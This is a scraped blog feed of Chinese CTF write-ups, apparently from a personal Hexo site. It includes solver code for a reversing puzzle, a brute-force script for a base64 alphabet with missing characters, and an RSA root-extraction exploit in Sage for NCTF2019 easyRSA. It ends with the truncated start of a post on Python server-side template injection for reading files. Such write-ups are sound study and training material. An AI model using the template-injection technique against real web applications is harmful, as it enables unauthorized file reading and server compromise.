punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input : z = "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v10<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">3</span> <span class="token operator">*</span> v12 <span class="token operator">-</span> v11 <span class="token operator">+</span> v10 <span class="token operator">!=</span> <span class="token number">185</span> <span class="token operator">||</span> <span class="token number">2</span> <span class="token operator">*</span> v12 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v11 <span class="token operator">-</span> v10 <span class="token operator">!=</span> <span class="token number">321</span> <span class="token operator">||</span> v11 <span class="token operator">+</span> v12 <span class="token operator">+</span> v10 <span class="token operator">!=</span> <span class="token number">173</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Game over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Great last level coming..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Last time: Kill it"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"x*x+x-7943722218936282=0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input x: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token operator">*</span> <span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x1C38C5F50DD7DALL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Game over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Great This is your FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag&#123;%s_%d%d%d_%lld&#125;"</span><span class="token punctuation">,</span> Str<span class="token punctuation">,</span> v12<span class="token punctuation">,</span> v11<span class="token punctuation">,</span> v10<span class="token punctuation">,</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;en5oy_746831_89127561&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>emmm，matlab跟sage都挺好用的，很难抉择啊，再等等吧那，到时候遇见好玩的看看那个用着更爽。</p><h2 id="2-base表爆破-python-，-WUSTCTF2020-B-se"><a href="#2-base表爆破-python-，-WUSTCTF2020-B-se" class="headerlink" title="2.base表爆破(python)，[WUSTCTF2020]B@se"></a>2.base表爆破(python)，[WUSTCTF2020]B@se</h2><pre class="line-numbers language-none"><code class="language-none">密文：MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD&#x3D;&#x3D;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs****kxyz012789+&#x2F;oh holy shit, something is missing...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一看就是特殊的base64，看见几个*，应该就是base64替换表缺失了4位，emmm，明天再写脚本，眼睁不开了。。。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> base64<span class="token keyword">import</span> stringcipher <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>m <span class="token operator">=</span> <span class="token string">'MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD=='</span>data1 <span class="token operator">=</span> <span class="token string">'JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs&#123;0&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;kxyz012789+/'</span>   <span class="token comment"># 缺 j u 3 4</span>s <span class="token operator">=</span> <span class="token string">'ju34'</span>data2 <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_uppercase <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'+/'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">for</span> a <span class="token keyword">in</span> s<span class="token punctuation">:</span>            <span class="token keyword">for</span> b <span class="token keyword">in</span> s<span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">!=</span> j <span class="token keyword">and</span> i <span class="token operator">!=</span> a <span class="token keyword">and</span> i <span class="token operator">!=</span> b <span class="token keyword">and</span> j <span class="token operator">!=</span> a <span class="token keyword">and</span> j <span class="token operator">!=</span> b <span class="token keyword">and</span> a <span class="token operator">!=</span> b<span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token string">""</span>                    cipherkey <span class="token operator">=</span> data1<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>                    <span class="token keyword">for</span> t <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipherkey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        cipher<span class="token punctuation">[</span>cipherkey<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> data2<span class="token punctuation">[</span>t<span class="token punctuation">]</span>                    <span class="token comment"># print(cipher)</span>                    <span class="token keyword">for</span> t <span class="token keyword">in</span> m<span class="token punctuation">:</span>                        <span class="token keyword">try</span><span class="token punctuation">:</span>                            flag <span class="token operator">+=</span> cipher<span class="token punctuation">[</span>t<span class="token punctuation">]</span>                        <span class="token keyword">except</span><span class="token punctuation">:</span>                            flag <span class="token operator">+=</span> t                    flag <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'wctf2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;'</span><span class="token comment"># flag&#123;base64_1s_v3ry_e@sy_and_fuN&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RSA之p-1可整除e、开大次方根-NCTF2019-easyRSA"><a href="#RSA之p-1可整除e、开大次方根-NCTF2019-easyRSA" class="headerlink" title="RSA之p-1可整除e、开大次方根-[NCTF2019]easyRSA"></a>RSA之p-1可整除e、开大次方根-[NCTF2019]easyRSA</h2><p><strong>稍微有点难，下面是官方的wp</strong></p><p>题面十分简洁，甚至都给出了<code>p, q</code>。乍一看，肯定觉得这是一道<strong>送分题</strong>，然而事实远非如此。</p><hr><p>正常情况下的RSA都要求<code>e</code>和<code>phi(n)</code>要互素，不过也有一些<code>e</code>和<code>phi(n)</code>有很小的公约数的题目，这些题目基本都能通过计算<code>e</code>对<code>phi(n)</code>的逆元<code>d</code>来求解。</p><p>然而本题则为<code>e</code>和<code>p-1</code>(或<code>q-1</code>)的最大公约数就是<code>e</code>本身，也就是说<code>e | p-1</code>，只有对<code>c</code>开<code>e</code>次方根才行。<br>可以将同余方程</p><script type="math/tex; mode=display">m^e \equiv c \quad (\text{mod}\ n)</script><p>化成</p><script type="math/tex; mode=display">\begin{aligned}m^e &\equiv c \quad (\text{mod}\ p)\newlinem^e &\equiv c \quad (\text{mod}\ q)\end{aligned}</script><p>然后分别在<code>GF(p)</code>和<code>GF(q)</code>上对<code>c</code>开<code>e=0x1337</code>次方根，再用<code>CRT</code>组合一下即可得到在<code>mod n</code>下的解。</p><hr><p>问题是，<strong>如何在有限域内开根</strong>？</p><p>这里<code>e</code>与<code>p-1</code>和<code>q-1</code>都不互素，不能简单地求个逆元就完事。</p><p>这种情况下，<strong>开平方根</strong>可以用<code>Tonelli–Shanks algorithm</code>，<a href="https://en.wikipedia.org/wiki/Tonelli–Shanks_algorithm">wiki</a>说这个算法可以<strong>扩展到开n次方根</strong>。</p><p>在这篇<a href="https://arxiv.org/pdf/1111.4877.pdf">paper</a>里给出了具体的算法：<code>Adleman-Manders-Miller rth Root Extraction Method</code></p><blockquote><p>应该还有其他的算法。。不过这一个对我来说比较容易去implement。</p></blockquote><p><img src="https://i.loli.net/2020/04/18/QNy9EWc7K4enJGu.jpg" alt="Adleman-Manders-Miller cubic root extraction method"></p><p>这个算法只能开出一个根，实际上开0x1337次方，最多会有0x1337个根（这题的情况下有0x1337个根）。</p><p>如何找到其他根？<br><a href="https://stackoverflow.com/questions/6752374/cube-root-modulo-p-how-do-i-do-this">StackOverflow – Cube root modulo P</a>给出了方法：</p><p><img src="https://i.loli.net/2020/04/18/lM6nyEOoiut7JB2.png" alt="How to find other roots"></p><p>如何找到所有的<code>primitve 0x1337th root of 1</code>?<br><a href="https://crypto.stackexchange.com/questions/63614/finding-the-n-th-root-of-unity-in-a-finite-field">StackExchange – Finding the n-th root of unity in a finite field</a>给出了方法：</p><p><img src="https://i.loli.net/2020/04/18/YHE1VsP4wbtr7Mf.jpg" alt="How to find primitive nth root of 1"></p><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><ul><li>先用<code>Adleman-Manders-Miller rth Root Extraction Method</code>在<code>GF(p)</code>和<code>GF(q)</code>上对<code>c</code>开<code>e</code>次根，分别得到一个解。大概不到10秒。</li><li>然后去找到所有的<code>0x1336</code>个<code>primitive nth root of 1</code>，乘以上面那个解，得到所有的<code>0x1337</code>个解。大概1分钟。</li><li>再用<code>CRT</code>对<code>GF(p)</code>和<code>GF(q)</code>上的两组<code>0x1337</code>个解组合成<code>mod n</code>下的解，可以得到<code>0x1337**2==24196561</code>个<code>mod n</code>的解。最后能通过<code>check</code>的即为<code>flag</code>。大概十几分钟。</li></ul><p><code>exp.sage</code>如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> time<span class="token comment"># About 3 seconds to run</span><span class="token keyword">def</span> <span class="token function">AMM</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> r<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n----------------------------------------------------------------------------------'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Start to run Adleman-Manders-Miller Root Extraction Method'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> o<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>    g <span class="token operator">=</span> GF<span class="token punctuation">(</span>q<span class="token punctuation">)</span>    o <span class="token operator">=</span> g<span class="token punctuation">(</span>o<span class="token punctuation">)</span>    p <span class="token operator">=</span> g<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> p <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> r<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> g<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Find p:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    t <span class="token operator">=</span> <span class="token number">0</span>    s <span class="token operator">=</span> q <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">while</span> s <span class="token operator">%</span> r <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        t <span class="token operator">+=</span> <span class="token number">1</span>        s <span class="token operator">=</span> s <span class="token operator">//</span> r    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Find s:&#123;&#125;, t:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">)</span>    k <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> s <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> r <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        k <span class="token operator">+=</span> <span class="token number">1</span>    alp <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> s <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> r    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Find alp:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>alp<span class="token punctuation">)</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> p <span class="token operator">^</span> <span class="token punctuation">(</span>r<span class="token operator">**</span><span class="token punctuation">(</span>t<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> s<span class="token punctuation">)</span>    b <span class="token operator">=</span> o <span class="token operator">^</span> <span class="token punctuation">(</span>r<span class="token operator">*</span>alp <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> p <span class="token operator">^</span> s    h <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> b <span class="token operator">^</span> <span class="token punctuation">(</span>r<span class="token operator">^</span><span class="token punctuation">(</span>t<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> d <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            j <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Calculating DLP...'</span><span class="token punctuation">)</span>            j <span class="token operator">=</span> <span class="token operator">-</span> dicreat_log<span class="token punctuation">(</span>a<span class="token punctuation">,</span> d<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Finish DLP...'</span><span class="token punctuation">)</span>        b <span class="token operator">=</span> b <span class="token operator">*</span> <span class="token punctuation">(</span>c<span class="token operator">^</span>r<span class="token punctuation">)</span><span class="token operator">^</span>j        h <span class="token operator">=</span> h <span class="token operator">*</span> c<span class="token operator">^</span>j        c <span class="token operator">=</span> c <span class="token operator">^</span> r    result <span class="token operator">=</span> o<span class="token operator">^</span>alp <span class="token operator">*</span> h    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finished in &#123;&#125; seconds."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Find one solution: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">findAllPRoot</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span>    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    proot <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>proot<span class="token punctuation">)</span> <span class="token operator">&lt;</span> e<span class="token punctuation">:</span>        proot<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>e<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span>    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finished in &#123;&#125; seconds."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> proot<span class="token keyword">def</span> <span class="token function">findAllSolutions</span><span class="token punctuation">(</span>mp<span class="token punctuation">,</span> proot<span class="token punctuation">,</span> cp<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> cp<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span>    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    all_mp <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> root <span class="token keyword">in</span> proot<span class="token punctuation">:</span>        mp2 <span class="token operator">=</span> mp <span class="token operator">*</span> root <span class="token operator">%</span> p        <span class="token keyword">assert</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>mp2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">==</span> cp<span class="token punctuation">)</span>        all_mp<span class="token punctuation">.</span>add<span class="token punctuation">(</span>mp2<span class="token punctuation">)</span>    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finished in &#123;&#125; seconds."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> all_mpc <span class="token operator">=</span> <span class="token number">10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span>p <span class="token operator">=</span> <span class="token number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span>q <span class="token operator">=</span> <span class="token number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span>e <span class="token operator">=</span> <span class="token number">0x1337</span>cp <span class="token operator">=</span> c <span class="token operator">%</span> pcq <span class="token operator">=</span> c <span class="token operator">%</span> qmp <span class="token operator">=</span> AMM<span class="token punctuation">(</span>cp<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token punctuation">)</span>mq <span class="token operator">=</span> AMM<span class="token punctuation">(</span>cq<span class="token punctuation">,</span> e<span class="token punctuation">,</span> q<span class="token punctuation">)</span>p_proot <span class="token operator">=</span> findAllPRoot<span class="token punctuation">(</span>p<span class="token punctuation">,</span> e<span class="token punctuation">)</span>q_proot <span class="token operator">=</span> findAllPRoot<span class="token punctuation">(</span>q<span class="token punctuation">,</span> e<span class="token punctuation">)</span>mps <span class="token operator">=</span> findAllSolutions<span class="token punctuation">(</span>mp<span class="token punctuation">,</span> p_proot<span class="token punctuation">,</span> cp<span class="token punctuation">,</span> p<span class="token punctuation">)</span>mqs <span class="token operator">=</span> findAllSolutions<span class="token punctuation">(</span>mq<span class="token punctuation">,</span> q_proot<span class="token punctuation">,</span> cq<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token keyword">print</span> mps<span class="token punctuation">,</span> mqs<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    h <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> h<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'NCTF'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment"># About 16 mins to run 0x1337^2 == 24196561 times CRT</span>start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Start CRT...'</span><span class="token punctuation">)</span><span class="token keyword">for</span> mpp <span class="token keyword">in</span> mps<span class="token punctuation">:</span>    <span class="token keyword">for</span> mqq <span class="token keyword">in</span> mqs<span class="token punctuation">:</span>        solution <span class="token operator">=</span> CRT_list<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>mpp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mqq<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span> q<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> check<span class="token punctuation">(</span>solution<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span>end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finished in &#123;&#125; seconds."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python_ssti</title>
      <link href="2020/11/24/python-ssti/"/>
      <url>2020/11/24/python-ssti/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-python2使用ssti读文件"><a href="#1-python2使用ssti读文件" class="headerlink" title="1.python2使用ssti读文件"></a>1.python2使用ssti读文件</h2><p>从主类里面找到<code>file</code>类，借助该类里面的方法读取文件，首先得知道<code>file</code>的位置(编号)。</p><h3 id="1-列举python内建类"><a href="#1-列举python内建类" class="headerlink" title="1.列举python内建类"></a>1.列举python内建类</h3><p>python2<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 